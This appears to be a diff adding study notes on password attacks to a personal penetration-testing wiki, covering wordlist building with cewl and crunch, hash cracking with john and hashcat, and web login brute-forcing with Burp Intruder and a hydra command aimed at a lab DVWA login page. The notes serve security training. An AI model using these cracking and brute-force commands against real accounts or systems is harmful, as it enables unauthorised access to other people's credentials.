@@ -5,3 +5,52 @@ Creation-Date: 2020-12-19T21:25:55-05:00
 ====== 0x3B Password Attacks ======
 Created Saturday 19 December 2020
 
+==== Generating Passowrd Lists and Cracking Hashes ====
+#A dictionary attack involves creating a file of obvious or popular passwords, such as commonly used
+passwords, names and simple variations of specific data. Effective dictionary files are not based on
+uneducated guessing but combine reasoning and research for optimal results.
+
+1. Determine password policies. (Include lockout as well, switch to //**spraying**//?)
+2. Collect information on targeted users or find keywords in their website.
+	//cewl -d [max links] -m [min word length] -w cewl1.txt [website]//
+	
+3. Extend the file with modified dictionary entries.
+	//crunch [min length] [max length] [charset] [options] -o wordlist1.txt//
+	
+	#Crunch uses character sets in entirety so it's useful to have a list you can easily copy
+	ABCDEFGHIJKLMNOPQRSTUVWXYZ
+	abcdefghijklmnopqrstuvwxyz
+	0123456789 
+	
+	#Use the @ symbol to denote which symbols you want modified like @@@@1980 will do four characters and add 1980 (someones birthday) to the end.
+4. Use the wordlist in a password attacking tool or use the default rockyou option.
+	//sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1-AxCrypt hash1.txt//
+		#hash1.txt is a list of hashes that we want cracked.
+
+	//hashcat -m 1800 -a 0 kali/Desktop/hash1.txt /usr/share/wordlists/rockyou.txt//
+		# -m 1800 designates the type of hash we are cracking (SHA512); Find more explanations here: https://hashcat.net/wiki/doku.php?id=example_hashes
+		# -a 0 designates a dictionary attack; a 3 is a brute force attack.
+		#hash1.txt is a list of hashes that we want cracked.
+		
+==== Cracking Web Passwords ====
+#Burpsuite
+1. Set foxy proxy to burpsuite mode.
+2. Open burpsuite and attempt to log on.
+3. Click send to intruder and then forward the request.
+4. Set username then set the password payload to your password list.
+
+#Hydra
+1. Intercept the login request with burpsuite.
+2. Enter values into your command using hydra.
+	//hydra [ip] [form: <url>:<form parameters>:<failure string>:Cookie]//
+	
+	#An example:
+	hydra 10.11.1.250 -t 2 -l admin [-L would specify list] -P /usr/share/wordlists/rockyou.txt [-p would specify a specific word] http-post-form [or http-get-form]
+	“/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed”
+
+
+
+
+
+
+
